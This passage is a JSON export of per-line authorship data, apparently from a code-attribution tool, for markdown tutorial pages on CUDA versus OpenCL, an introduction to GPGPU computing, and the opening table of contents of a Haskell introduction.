        "content": "\u003e You can also find out more about the features and specifications of each compute capability version from the [official documentation](https://docs.nvidia.com/cuda/cuda-c-programming-guide/index.html#compute-capabilities) or [these tables from Wikipedia](https://en.wikipedia.org/wiki/CUDA#Version_features_and_specifications)."
      },
      {
        "lineNumber": 212,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 213,
        "author": {
          "gitId": "-"
        },
        "content": "## § 3. CUDA vs OpenCL"
      },
      {
        "lineNumber": 214,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 215,
        "author": {
          "gitId": "-"
        },
        "content": "### § 3.1 What is OpenCL?"
      },
      {
        "lineNumber": 216,
        "author": {
          "gitId": "-"
        },
        "content": "OpenCL (Open Computing Language) is an open standard for cross-platform, parallel programming of diverse processors found in personal computers, servers, mobile devices and embedded platforms.\u003csup\u003e[[9]](#footnote9)\u003c/sup\u003e"
      },
      {
        "lineNumber": 217,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 218,
        "author": {
          "gitId": "-"
        },
        "content": "### § 3.2 Differences between CUDA and OpenCL"
      },
      {
        "lineNumber": 219,
        "author": {
          "gitId": "-"
        },
        "content": "First and foremost, the most distinctive difference is in how CUDA is proprietary to NVIDIA, whereas OpenCL, while owned by the Khronos Group, is open-sourced. The implications are that if you have an NVIDIA GPU, it supports both CUDA and OpenCL, but if not, and you\u0027re using an AMD GPU, it only supports OpenCL."
      },
      {
        "lineNumber": 220,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 221,
        "author": {
          "gitId": "-"
        },
        "content": "Additionally, they use different terms. For instance, what NIVIDIA refers to as a \"thread\", OpenCL refers to as a \"work item\"."
      },
      {
        "lineNumber": 222,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 223,
        "author": {
          "gitId": "-"
        },
        "content": "This topic is widely covered. Here are some good references on what the differences are, and what the implications are when choosing one over the other:"
      },
      {
        "lineNumber": 224,
        "author": {
          "gitId": "-"
        },
        "content": "- https://wiki.tiker.net/CudaVsOpenCL"
      },
      {
        "lineNumber": 225,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- https://create.pro/blog/opencl-vs-cuda/"
      },
      {
        "lineNumber": 226,
        "author": {
          "gitId": "-"
        },
        "content": "- https://streamcomputing.eu/blog/2010-04-22/difference-between-cuda-and-opencl/"
      },
      {
        "lineNumber": 227,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 228,
        "author": {
          "gitId": "-"
        },
        "content": "## § 4. Further Readings"
      },
      {
        "lineNumber": 229,
        "author": {
          "gitId": "-"
        },
        "content": "- [Official CUDA C developer resources](https://developer.nvidia.com/cuda-zone)"
      },
      {
        "lineNumber": 230,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- [Official CUDA C programming guide](https://docs.nvidia.com/cuda/cuda-c-programming-guide)"
      },
      {
        "lineNumber": 231,
        "author": {
          "gitId": "-"
        },
        "content": "- [Lightning talk slides: GPU Programming Made Easy with Python](https://github.com/nus-oss/lightningtalks/issues/44)"
      },
      {
        "lineNumber": 232,
        "author": {
          "gitId": "-"
        },
        "content": "- [se-edu\u0027s learning resource on GPGPU](gpgpu.html)"
      },
      {
        "lineNumber": 233,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 234,
        "author": {
          "gitId": "-"
        },
        "content": "## § 5. References"
      },
      {
        "lineNumber": 235,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 236,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "\u003ca name\u003d\"footnote1\"\u003e[1]\u003c/a\u003e: https://www.nvidia.com/object/cuda_home_new.html\u003cbr /\u003e"
      },
      {
        "lineNumber": 237,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "\u003ca name\u003d\"footnote2\"\u003e[2]\u003c/a\u003e: https://docs.nvidia.com/cuda/cuda-c-programming-guide/#kernels\u003cbr /\u003e"
      },
      {
        "lineNumber": 238,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote3\"\u003e[3]\u003c/a\u003e: https://llpanorama.wordpress.com/2008/06/11/threads-and-blocks-and-grids-oh-my/\u003cbr /\u003e"
      },
      {
        "lineNumber": 239,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "\u003ca name\u003d\"footnote4\"\u003e[4]\u003c/a\u003e: https://docs.nvidia.com/cuda/cuda-c-programming-guide/#hardware-implementation\u003cbr /\u003e"
      },
      {
        "lineNumber": 240,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "\u003ca name\u003d\"footnote5\"\u003e[5]\u003c/a\u003e: https://docs.nvidia.com/gameworks/content/developertools/desktop/analysis/report/cudaexperiments/kernellevel/achievedoccupancy.htm\u003cbr /\u003e"
      },
      {
        "lineNumber": 241,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote6\"\u003e[6]\u003c/a\u003e: https://mathema.tician.de/software/pycuda/\u003cbr /\u003e"
      },
      {
        "lineNumber": 242,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "\u003ca name\u003d\"footnote7\"\u003e[7]\u003c/a\u003e: https://stackoverflow.com/a/5957647\u003cbr /\u003e"
      },
      {
        "lineNumber": 243,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote8\"\u003e[8]\u003c/a\u003e: https://developer.nvidia.com/cuda-faq#Programming\u003cbr /\u003e"
      },
      {
        "lineNumber": 244,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote9\"\u003e[9]\u003c/a\u003e: https://www.khronos.org/opencl/\u003cbr /\u003e"
      },
      {
        "lineNumber": 245,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 246,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "jamessspanggg": 8,
      "iskandarzulkarnaien": 21,
      "-": 217
    }
  },
  {
    "path": "contents/gpgpu/gpgpu.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: An Introduction to GPGPU"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# An Introduction to GPGPU"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "###### Authors: [Pierce Anderson Fu](https://github.com/PierceAndy), [Nguyen Quoc Bao](https://github.com/bqnguyen94)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [§ 1. GPGPU‎](#1-gpgpu)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [§ 1.1 What is GPGPU?‎](#1-1-what-is-gpgpu)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [§ 1.2 Why bother with parallel processing?‎](#1-2-why-bother-with-parallel-processing)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [§ 1.3 Aren\u0027t multicore CPUs enough?‎](#1-3-aren-t-multicore-cpus-enough)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [§ 1.4 What are the challenges with GPGPU?‎](#1-4-what-are-the-challenges-with-gpgpu)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [§ 1.5 Implementations‎](#1-5-implementations)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [§ 1.6 GPGPU in action‎](#1-6-gpgpu-in-action)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [§ 2. Further Readings‎](#2-further-readings)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [§ 3. References‎](#3-references)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": "## § 1. GPGPU"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "### § 1.1 What is GPGPU?"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "GPGPU stands for General-purpose computing on graphics processing units. It is the use of a graphics processing unit (GPU), which typically handles computation only for computer graphics, to perform computation in applications traditionally handled by the central processing unit (CPU).\u003csup\u003e[[1]](#footnote1)\u003c/sup\u003e"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "Simply put, it\u0027s a kind of parallel processing where we\u0027re trying to exploit the data-parallel hardware on GPUs to improve the throughput of our computers."
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### § 1.2 Why Bother With Parallel Processing?"
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "Moore\u0027s law is the observation made by Gordon Moore that the density of transistors in an integrated circuit board doubles approximately every two years. It has long been co-opted by the semiconductor industry as a target, and consumers have taken this growth for granted."
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "Because it suggests exponential growth, it is unsustainable and it cannot be expected to continue indefinitely. In the words of Moore himself, \"It can\u0027t continue forever.\".\u003csup\u003e[[2]](#footnote2)\u003c/sup\u003e There are hard physical limits to this scaling such as heat dissipation rate\u003csup\u003e[[3]](#footnote3)\u003c/sup\u003e and size of microprocessor features.\u003csup\u003e[[4]](#footnote4)\u003c/sup\u003e"
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "As software engineers, this means that free and regular performance gains can no longer be expected.\u003csup\u003e[[5]](#footnote5)\u003c/sup\u003e To fully exploit CPU throughput gains, we need to code differently."
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### § 1.3 Aren\u0027t Multicore CPUs Enough?"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "Between CPUs and GPUs, there are differences in **scale** and **architecture**."
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "- In terms of **scale**, CPUs only have several cores while GPUs house up to thousands of cores."
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "- In terms of **architecture**, CPUs are designed to handle sequential processing and branches effectively, while GPUs excel at performing simpler computations on large amounts of data."
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "This means that CPUs and GPUs excel at different tasks. You\u0027ll typically want to utilize GPGPU on tasks that are data parallel and compute intensive (e.g. graphics, matrix operations)."
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e ##### Definitions:"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e *Data parallelism* refers to how a processor executes the same operation on different data elements simultaneously."
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e *Compute intensive* refers to how the algorithm will have to process lots of data elements."
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### § 1.4 What are the Challenges With GPGPU?"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "Not all problems are inherently parallelizable."
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "The SIMT (Single Instruction, Multiple Threads) architecture of GPUs means that they don\u0027t handle branches and inter-thread communication well."
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "### § 1.5 Implementations"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- CUDA: [Official website](https://www.nvidia.com/object/cuda_home_new.html)"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "- OpenCL: [Official website](https://www.khronos.org/opencl/)"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "### § 1.6 GPGPU in action"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "The benefits of GPGPU are even more pronounced when it comes to embedded systems and Internet of Things (IoT) applications, where computing power is often compromised for physical space, weight, and power consumption. For instance, NVIDIA\u0027s Jetson TX2, a computation processor board that delivers the processing capability of the Pascal GPU architecture in a package the size of a business card\u003csup\u003e[[6]](#footnote6)\u003c/sup\u003e. The Pascal architecture is used in many desktop computers, data centres, and supercomputers\u003csup\u003e[[7]](#footnote7)\u003c/sup\u003e. Along with its small form factor, this makes the Jetson ideal for embedded systems that require intensive processing power."
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "![NVIDIA\u0027s Jetson TX2](jetson_tx2.jpg \"NVIDIA\u0027s Jetson TX2\")"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "*[NVIDIA Jetson TX2 embedded system-on-module with Thermal Transfer Plate (TTP)](https://devblogs.nvidia.com/jetson-tx2-delivers-twice-intelligence-edge/)*"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "Packed with a NVIDIA Pascal GPU with 256 CUDA cores at maximally 1300 MHz\u003csup\u003e[[6]](#footnote6)\u003c/sup\u003e, the TX2 is capable of intensive parallel computational tasks such as real-time vision processing or deploying deep neural networks, allowing mobile platforms to solve complex, real-world problems."
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "![DRIVENet](drivenet.jpg \"NVIDIA DRIVENet Demo\")"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "*[CES 2016: NVIDIA DRIVENet Demo - Visualizing a Self-Driving Future](https://www.youtube.com/watch?v\u003dHJ58dbd5g8g)*"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "Compatible with a range of components and large ecosystem products\u003csup\u003e[[8]](#footnote8)\u003c/sup\u003e, the Jetson platform is now widely used for deploying vision and neural network processing onboard mobile platforms like self-driving cars, autonomous robots, drones, IoT, handheld medical devices, etc\u003csup\u003e[[9]](#footnote9)\u003c/sup\u003e."
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "## § 2. Further Readings"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "- [How concurrency is the next big change in software development since OO](http://www.gotw.ca/publications/concurrency-ddj.htm)"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- [Official CUDA C programming guide: What GPUs excel at processing, and why](https://docs.nvidia.com/cuda/cuda-c-programming-guide/#from-graphics-processing-to-general-purpose-parallel-computing)"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- [Official CUDA C programming guide: Architecture of NVIDIA GPUs](https://docs.nvidia.com/cuda/cuda-c-programming-guide/#simt-architecture)"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "- [Lightning talk slides: An Introduction to GPGPU](https://github.com/nus-oss/lightningtalks/issues/10)"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "- [se-edu\u0027s learning resource on CUDA](cuda.html)"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "## § 3. References"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote1\"\u003e[1]\u003c/a\u003e: https://en.wikipedia.org/wiki/General-purpose_computing_on_graphics_processing_units\u003cbr /\u003e"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "\u003ca name\u003d\"footnote2\"\u003e[2]\u003c/a\u003e: https://www.techworld.com/news/operating-systems/moores-law-is-dead-says-gordon-moore-3576581/\u003cbr /\u003e"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "\u003ca name\u003d\"footnote3\"\u003e[3]\u003c/a\u003e: https://theory.physics.lehigh.edu/rotkin/newdata/mypreprs/spie-09b.pdf\u003cbr /\u003e"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote4\"\u003e[4]\u003c/a\u003e: https://arstechnica.com/gadgets/2016/07/itrs-roadmap-2021-moores-law/\u003cbr /\u003e"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote5\"\u003e[5]\u003c/a\u003e: http://www.gotw.ca/publications/concurrency-ddj.htm\u003cbr /\u003e"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote6\"\u003e[6]\u003c/a\u003e: https://www.nvidia.com/en-us/autonomous-machines/embedded-systems-dev-kits-modules/\u003cbr /\u003e"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote7\"\u003e[7]\u003c/a\u003e: https://en.wikipedia.org/wiki/Tegra#Tegra_X1/\u003cbr /\u003e"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote8\"\u003e[8]\u003c/a\u003e: https://elinux.org/Jetson_TX2#Ecosystem_Products\u003cbr /\u003e"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote9\"\u003e[9]\u003c/a\u003e: https://developer.nvidia.com/embedded/learn/success-stories\u003cbr /\u003e"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 3,
      "jamessspanggg": 5,
      "iskandarzulkarnaien": 12,
      "-": 82
    }
  },
  {
    "path": "contents/haskell/Haskell.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Introduction to Haskell"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Introduction to Haskell"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Author: Thenaesh Elango"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": "* [Overview](#overview)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": "* [Getting Started](#getting-started)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Installation](#installation)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": "        * [System-Wide Installation](#system-wide-installation)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": "        * [Stack Installation](#stack-installation)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Usage](#usage)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": "* [Whirlwind Tour](#whirlwind-tour)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Types](#types)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "        * [Basic Types‎](#basic-types)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "        * [Functions \u0026 Currying‎](#functions-and-amp-currying)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "        * [Algebraic Data Types \u0026 Pattern Matching‎](#algebraic-data-types-and-amp-pattern-matching)"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "        * [Type Parameters‎](#type-parameters)"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "        * [Inductive Data Types‎](#inductive-data-types)"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "        * [Further Reading‎](#further-reading)"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "    * [General Functional Programming](#general-functional-programming)"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "        * [Functions‎](#functions)"
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "        * [Recursion‎](#recursion)"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "        * [Lists‎](#lists)"
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "        * [List Processing - Fold‎](#list-processing-fold)"
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "        * [List Processing - Map \u0026 Filter‎](#list-processing-map-and-amp-filter)"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "        * [Programming with Other Inductive Data Types‎](#programming-with-other-inductive-data-types)"
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "        * [Further Reading‎](#further-reading-2)"
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Typeclasses](#typeclasses)"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "        * [Defining and Instantiating Typeclasses‎](#defining-and-instantiating-typeclasses)"
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "        * [Adding Typeclass Constraints to Functions‎](#adding-typeclass-constraints-to-functions)"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "        * [Instantiating Typeclasses with Parameterized Type Constructors‎](#instantiating-typeclasses-with-parameterized-type-constructors)"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "        * [Further Reading‎](#further-reading-3)"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "* [Common Haskell Idioms](#common-haskell-idioms)"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Functors](#functors)"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Applicative Functors](#applicative-functors)"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Monads](#monads)"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "* [Guides](#guides)"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "# Overview"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "Haskell is a purely functional programming language with strong, static,"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "inferred typing."
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "While Haskell has its roots in academia, its emphasis on purity and"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
